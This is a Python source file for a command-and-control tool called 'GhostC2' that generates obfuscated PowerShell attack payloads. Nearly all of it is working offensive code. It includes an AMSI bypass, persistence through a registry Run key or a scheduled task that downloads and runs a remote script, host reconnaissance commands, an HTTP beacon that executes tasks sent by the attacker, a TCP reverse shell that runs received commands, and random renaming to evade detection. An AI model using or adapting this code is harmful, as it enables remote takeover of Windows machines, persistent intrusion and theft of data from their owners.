import random
import string
import os
import base64
from datetime import datetime

def rand_name(length=None):
    length = length or random.randint(8, 14)
    return ''.join(random.choices(string.ascii_letters, k=length))

def junk_code():
    j = [
        f"${rand_name()} = {random.randint(1,100)}",
        f"# {rand_name()}_{random.randint(1000,9999)}",
        f"$null = {random.randint(0,1)}",
        f"${rand_name()} = '{rand_name(3)}'",
        f"# {rand_name(4)}"
    ]
    return random.choice(j) + "\n"

def get_amsi_bypass(method="redundant"):
    if method == "basic":
        return "[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true);"
    elif method == "redundant":
        return """
try{[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)}catch{}
try{$w=[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils');$f=$w.GetField('amsiInitFailed','NonPublic,Static');$f.SetValue($null,$true)}catch{}
"""
    else:  # advanced (currently same as redundant for stability)
        return """
try{[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField(('amsi'+'Init'+'Failed'),'NonPublic,Static').SetValue($null,$true)}catch{}
"""

def get_persistence(method, host, port):
    if method == "registry":
        return f"""
New-ItemProperty -Path 'HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Run' -Name '{rand_name()}' -Value 'powershell.exe -nop -w hidden -c "IEX(New-Object Net.WebClient).DownloadString(\\\"http://{host}:{port}/payload.ps1\\\")"' -Force;
"""
    elif method == "schtasks":
        return f"""
schtasks /create /sc minute /mo 30 /tn "{rand_name()}" /tr "powershell.exe -nop -w hidden -c 'IEX(New-Object Net.WebClient).DownloadString(\\\"http://{host}:{port}/payload.ps1\\\")'" /F;
"""
    else:
        return ""

def get_recon_commands():
    return """
$recon = systeminfo; $recon += whoami /all; $recon += ipconfig /all;
"""

def xor_wrapper():
    return """
function XOR($data,$key=0x5A){
    [byte[]]$b=[System.Text.Encoding]::ASCII.GetBytes($data);
    for($i=0;$i -lt $b.Length;$i++){$b[$i]=$b[$i] -bxor $key};
    return [System.Text.Encoding]::ASCII.GetString($b);
}
"""
def get_http_tasker(host, port=8080):
    return f"""
Start-Job -ScriptBlock {{
    $stream = $null
    try {{
        $client = New-Object System.Net.Sockets.TCPClient("{host}",1443)
        $stream = $client.GetStream()
    }} catch {{}}

    while ($true) {{
        try {{
            $hostname = $env:COMPUTERNAME
            $ip = (Invoke-RestMethod -Uri "http://ifconfig.me")
            $payload = "ps_reverse"

            $resp = Invoke-RestMethod -Uri "http://{host}:{port}/beacon" -Method Post -Body @{{hostname=$hostname;ip=$ip;payload=$payload}} | ConvertTo-Json -Depth 3
            $tasks = ($resp | ConvertFrom-Json).tasks

            foreach ($cmd in $tasks) {{
                $out = Invoke-Expression $cmd | Out-String

                # Write to reverse shell
                if ($stream) {{
                    try {{
                        $send = "[GhostC2] Command: $cmd`n$out`n"
                        $bytes = [System.Text.Encoding]::ASCII.GetBytes($send)
                        $stream.Write($bytes, 0, $bytes.Length)
                        $stream.Flush()
                    }} catch {{}}
                }}

                # Send result back to GhostC2
                $body = @{{hostname=$hostname;command=$cmd;result=$out;payload=$payload}} | ConvertTo-Json -Depth 3
                Invoke-RestMethod -Uri "http://{host}:{port}/result" -Method Post -Body $body -ContentType "application/json"
            }}
        }} catch {{}}
        Start-Sleep -Seconds 10
    }}
}} | Out-Null
"""


def generate_obfuscated_ps(
    host="localhost",
    port=1443,
    amsi_bypass="redundant",
    persistence="none",
    auto_recon=False,
    xor_encrypt=False,
    write_file=True,
    http_tasker=False,  # ⬅️ new flag
    http_port=8080
):
    parts = []

    # AMSI bypass
    parts.append(get_amsi_bypass(amsi_bypass))

    if http_tasker:
        parts.append(get_http_tasker(host, http_port))

    # Persistence (optional)
    if persistence != "none":
        parts.append(get_persistence(persistence, host, port))

    # XOR function (optional)
    if xor_encrypt:
        parts.append(xor_wrapper())

    # Recon (optional)
    recon_cmd = get_recon_commands() if auto_recon else ""

    # Core shell (proven good!)
    core_shell = f"""
$client = New-Object System.Net.Sockets.TCPClient('{host}',{port});
$stream = $client.GetStream();
[byte[]]$bytes = 0..65535|%{{0}};
while(($i = $stream.Read($bytes,0,$bytes.Length)) -ne 0){{
    $cmd = (New-Object System.Text.ASCIIEncoding).GetString($bytes,0,$i).Trim();
    try {{
        $result = iex $cmd 2>&1 | Out-String;
    }} catch {{
        $result = $_.Exception.Message;
    }}
    $result += 'PS ' + (pwd).Path + '> ';
    {( "$result = XOR($result);" if xor_encrypt else "" )}
    $sendbyte = [System.Text.Encoding]::ASCII.GetBytes($result);
    $stream.Write($sendbyte,0,$sendbyte.Length);
    $stream.Flush();
}}
"""

    # Add optional recon
    if recon_cmd:
        core_shell = recon_cmd + core_shell

    parts.append(core_shell)

    payload_final = "\n".join(parts)

    if write_file:
        folder = os.path.abspath(os.path.join(os.path.dirname(__file__), '..', 'server', 'payloads'))
        os.makedirs(folder, exist_ok=True)
        filename = f"ps_payload_{datetime.now().strftime('%Y%m%d_%H%M%S')}.ps1"
        path = os.path.join(folder, filename)
        with open(path, 'w') as f:
            f.write(payload_final)
        return filename
    else:
        return payload_final

# Alias (preserve existing calls)
generate_polymorphic_ps = generate_obfuscated_ps
